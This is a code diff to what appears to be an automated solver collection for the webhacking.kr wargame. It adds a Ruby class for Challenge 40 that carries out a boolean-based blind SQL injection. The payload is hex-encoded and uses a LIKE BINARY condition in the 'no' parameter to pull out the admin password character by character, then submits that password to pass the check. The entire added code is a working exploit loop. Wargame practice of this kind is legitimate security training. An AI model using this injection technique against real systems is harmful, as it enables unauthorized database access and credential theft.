@@ -756,6 +756,67 @@ module WebhackingKR
   end
 
   ##
+  # Challenge 40
+  class Challenge40 < ChallengeBase
+    CHALLENGE = 40
+
+    PATH = '/challenge/web-29/'
+    PARAM_NO = 'no'
+    PARAM_ID = 'id'
+    PARAM_PW = 'pw'
+    PARAM_AUTH = 'auth'
+    LOGIN = 'admin'
+    PAYLOAD = '(0)||(`id`=(0x$LOGIN$)&&`pw`LIKE(BINARY(0x$PASSWORD$)))#'
+    ALPHABET =
+      ('a'..'z').to_a +
+      ('A'..'Z').to_a +
+      ('0'..'9').to_a +
+      ['_', '-']
+
+    def exec
+      password = String.new
+      log('Searching password')
+      search = true
+      while search
+        ALPHABET.each.with_index do |char, i|
+          payload = PAYLOAD.dup
+          c = char.sub('_', '\\_')
+          payload.sub!('$LOGIN$', LOGIN.unpack1('H*'))
+          payload.sub!('$PASSWORD$', "#{password}#{char}%".unpack1('H*'))
+          query = URI.encode_www_form(
+            PARAM_NO => payload,
+            PARAM_ID => 'guest',
+            PARAM_PW => 'guest'
+          )
+          response = get("#{PATH}?#{query}")
+          match = /#{PARAM_AUTH}/.match(response.body)
+          unless match
+            next if ALPHABET.length != i + 1
+
+            search = false
+            break
+          end
+
+          password << char
+          log(password)
+          break
+        end
+      end
+
+      if password.empty?
+        failed('Password not found')
+        return
+      end
+
+      log("Password found: #{password}")
+      log('Authenticating')
+      query = URI.encode_www_form(PARAM_AUTH => password)
+      response = get("#{PATH}?#{query}")
+      check(response.body)
+    end
+  end
+
+  ##
   # Challenge 42
   class Challenge42 < ChallengeBase
     CHALLENGE = 42
